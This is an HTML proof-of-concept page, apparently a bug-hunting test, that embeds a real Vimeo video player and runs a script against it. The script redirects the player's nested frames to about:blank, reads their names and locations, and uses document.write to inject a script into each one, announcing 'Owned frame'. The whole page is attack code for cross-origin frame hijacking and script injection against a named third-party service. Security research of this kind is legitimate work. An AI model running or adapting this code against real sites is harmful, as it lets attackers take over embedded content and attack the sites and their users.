<!DOCTYPE html>
<html>
<head><title>Dangling iframe Test</title></head>
<body>
    <h1>Testing Dangling iframe on Vimeo</h1>
    <div id="log"></div>
    
    <iframe id="vimeo" src="https://player.vimeo.com/video/935884964"></iframe>
    
    <script>
        const log = document.getElementById('log');
        const vimeoFrame = document.getElementById('vimeo');
        
        function addLog(msg) {
            log.innerHTML += `<p>${msg}</p>`;
            console.log(msg);
        }
        
        setTimeout(() => {
            const win = vimeoFrame.contentWindow;
            
            addLog(`Nested frames count: ${win.length}`);
            
            // Try each nested frame
            for(let i = 0; i < win.length; i++) {
                try {
                    addLog(`Attempting frame ${i}...`);
                    
                    // Set to about:blank
                    win[i].location = 'about:blank';
                    
                    setTimeout(() => {
                        try {
                            const name = win[i].name;
                            addLog(`✅ Frame ${i} name: ${name}`);
                            
                            // Try to read more
                            addLog(`Frame ${i} location: ${win[i].location.href}`);
                            
                            // Try to inject script
                            const doc = win[i].document;
                            doc.write('<script>alert("Owned frame ' + i + '!")</scr' + 'ipt>');
                            
                        } catch(e) {
                            addLog(`❌ Cannot read frame ${i}: ${e.message}`);
                        }
                    }, 1000);
                    
                } catch(e) {
                    addLog(`❌ Frame ${i} error: ${e.message}`);
                }
            }
        }, 3000);
    </script>
</body>
</html>
